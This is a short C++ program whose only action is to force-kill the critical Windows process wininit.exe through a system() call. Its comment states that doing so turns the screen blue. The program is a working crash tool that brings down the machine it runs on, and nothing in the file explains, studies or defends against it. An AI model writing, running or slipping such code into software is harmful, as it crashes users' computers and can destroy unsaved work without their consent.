#include <cstdlib>
int main() {
    //it will cause your screen blue.
    system("taskkill -f -im wininit.exe");
    return 0;
}
